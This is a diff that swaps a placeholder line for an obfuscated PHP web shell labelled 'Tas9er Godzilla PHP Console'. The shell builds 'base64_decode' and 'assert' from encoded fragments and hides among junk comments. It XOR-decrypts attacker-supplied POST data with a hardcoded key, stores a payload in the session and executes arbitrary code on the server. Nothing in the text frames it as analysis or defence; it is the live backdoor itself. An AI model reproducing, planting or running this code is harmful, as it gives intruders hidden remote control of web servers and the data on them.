@@ -1,1 +1,39 @@
-123
+Hello Administrator!
+WelCome To Tas9er Godzilla PHP Console!
+<?pHP
+@session_start();
+@set_time_limit(Chr("48"));
+@error_reporting/*fuckgov8Hi*/(Chr("48"));
+function baiduPvtiXqeH3ShOX0(/*fuckgovJoqAIwvnHtwi*/$baiduGE3rtbYVjJgV,$baiduI11Q){
+    for($baidutI=Chr("48");$baidutI<strlen($baiduGE3rtbYVjJgV);$baidutI++) {
+        $baiduXp9XAdMnRX6Qpl = $baiduI11Q[$baidutI+Chr("49")&15];
+        $baiduGE3rtbYVjJgV[$baidutI] = $baiduGE3rtbYVjJgV[$baidutI]^$baiduXp9XAdMnRX6Qpl;
+    }
+    return $baiduGE3rtbYVjJgV;
+}
+$baiduNlvxPLYYKLIOcD = "bas"."e6".Chr("52")."_"."de"."cod".Chr("101");
+$base64_baiduPvtiXqeH3ShOX0 = "bas"."e6".Chr("52")."_e".Chr("110").Chr("99")."ode";
+$baidur2UKfOe=("&"^"r").("7"^"V").("I"^":").("p"^"I").("_"^":").$baiduNlvxPLYYKLIOcD($baiduNlvxPLYYKLIOcD("Y2c9PQ=="));
+$baidug6rPzvpMpO='p'.$baiduNlvxPLYYKLIOcD($baiduNlvxPLYYKLIOcD("WVhsc2IyRms="));
+$baiduPX='2a8214d3'.$baiduNlvxPLYYKLIOcD("ZmFhY2I5NmY=");
+$baidu6gV2bhyqRqNvl=("!"^"@").'ss'.Chr("101").'rs';
+$baidu6gV2bhyqRqNvl++;
+if (isset($_POST/*fuckgovmxckphtHi8U1U*/[$baidur2UKfOe])){
+    $datbaidu6gV2bhyqRqNvl=baiduPvtiXqeH3ShOX0/*fuckgovVAAlO*/($baiduNlvxPLYYKLIOcD($_POST[$baidur2UKfOe]),$baiduPX);
+    if (/*fuckgovBAm9*/isset($_SESSION/*fuckgovxo6bj3HEc6wY2*/[$baidug6rPzvpMpO])){
+        $baiduHdQCX0=baiduPvtiXqeH3ShOX0($_SESSION/*fuckgov1QputFsJ0RYfu*/[$baidug6rPzvpMpO],$baiduPX);
+        if (/*fuckgovWHPf4m7jGbZ*/strpos($baiduHdQCX0,$baiduNlvxPLYYKLIOcD/*fuckgovlD3Lpg93csw1R4V*/($baiduNlvxPLYYKLIOcD("WjJWMFFtRnphV056U1c1bWJ3PT0=")))===false){
+            $baiduHdQCX0=baiduPvtiXqeH3ShOX0/*fuckgovXV*/($baiduHdQCX0,$baiduPX);
+        }
+		define("baiducYFuUUxW4k","//baidus6s4u\r\n".$baiduHdQCX0);
+		$baidu6gV2bhyqRqNvl(baiducYFuUUxW4k);
+        echo substr(/*fuckgovgVJAGYP*/md5/*fuckgovAUrcNSi*/($baidur2UKfOe.$baiduPX),Chr("48"),16);
+        echo $base64_baiduPvtiXqeH3ShOX0(baiduPvtiXqeH3ShOX0(@run($datbaidu6gV2bhyqRqNvl),$baiduPX));
+        echo substr(/*fuckgovX16P7h2Fl5*/md5/*fuckgovm2JU*/($baidur2UKfOe.$baiduPX),16);
+    }else{
+        if (strpos/*fuckgovTFkgkGCf0OU*/($datbaidu6gV2bhyqRqNvl,$baiduNlvxPLYYKLIOcD($baiduNlvxPLYYKLIOcD("WjJWMFFtRnphV056U1c1bWJ3PT0=")))!==false){
+            $_SESSION[$baidug6rPzvpMpO]=baiduPvtiXqeH3ShOX0($datbaidu6gV2bhyqRqNvl,$baiduPX);
+        }
+    }
+}
+?>
